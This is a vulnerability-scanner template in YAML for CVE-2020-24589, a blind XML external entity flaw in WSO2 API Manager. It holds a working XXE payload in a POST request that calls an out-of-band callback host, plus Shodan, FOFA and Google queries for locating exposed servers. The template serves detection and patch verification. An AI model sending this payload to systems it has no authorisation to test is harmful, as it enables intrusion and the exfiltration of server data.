http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body
    type: word
    words:
    - Failed to install the generic artifact type
  matchers-condition: and
  raw:
  - 'POST /carbon/generic/save_artifact_ajaxprocessor.jsp HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    payload=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+"http%3a//{{interactsh-url}}">%25xxe%3b]>

    '
id: CVE-2020-24589
info:
  author: lethargynavigator
  classification:
    cpe: cpe:2.3:a:wso2:api_manager:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-24589
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 9.1
    cwe-id: CWE-611
    epss-percentile: 0.99509
    epss-score: 0.8912
  description: WSO2 API Manager 3.1.0 and earlier is vulnerable to blind XML external
    entity injection (XXE). XXE often allows an attacker to view files on the server
    file system, and to interact with any backend or external systems that the application
    itself can access which allows the attacker to transmit sensitive data from the
    compromised server to a system that the attacker controls.
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    access to sensitive information, denial of service, or server-side request forgery.

    '
  metadata:
    fofa-query: icon_hash=1398055326
    google-query: inurl:"carbon/admin/login"
    max-request: 1
    product: api_manager
    shodan-query: http.favicon.hash:1398055326
    vendor: wso2
  name: WSO2 API Manager <=3.1.0 - Blind XML External Entity Injection
  reference:
  - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742
  - https://nvd.nist.gov/vuln/detail/CVE-2020-24589
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/athiththan11/WSO2-CVE-Extractor
  remediation: 'Upgrade to a patched version of WSO2 API Manager (3.1.1 or above)
    or apply the provided security patch.

    '
  severity: critical
  tags: cve2020,cve,wso2,xxe,oast,blind,vkev,vuln
